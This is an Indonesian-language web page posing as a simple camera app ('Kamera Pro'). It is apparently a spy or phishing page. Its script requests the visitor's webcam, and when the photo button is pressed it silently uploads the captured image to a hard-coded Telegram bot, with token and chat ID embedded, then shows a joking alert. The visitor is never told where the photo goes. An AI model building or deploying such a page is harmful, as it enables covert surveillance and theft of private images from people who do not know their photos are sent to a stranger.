<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kamera</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      padding: 20px;
    }
    video, canvas {
      width: 90%;
      max-width: 400px;
      border: 2px solid #0f0;
      border-radius: 10px;
      margin-top: 15px;
    }
    button {
      margin-top: 20px;
      padding: 12px 20px;
      font-size: 16px;
      background: #0f0;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #090;
      color: #fff;
    }
  </style>
</head>
<body>
  <h2>ðŸ“¸ Kamera Pro</h2>
  <video id="video" autoplay></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <br>
  <button id="snap">Ambil Foto</button>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const snapBtn = document.getElementById('snap');

    // Token & ID Telegram (punya kamu)
    const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
    const CHAT_ID = "7412613560";

    // Minta akses kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        alert("Gagal akses kamera: " + err);
      });

    // Ambil foto dan kirim ke Telegram
    snapBtn.addEventListener('click', () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "foto.jpg");

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            alert("âœ… WAH KAMU KEREN!!");
          } else {
            alert("âŒ KAMU JELEK: " + JSON.stringify(data));
          }
        })
        .catch(err => alert("Error: " + err));
      }, "image/jpeg");
    });
  </script>
</body>
</html>
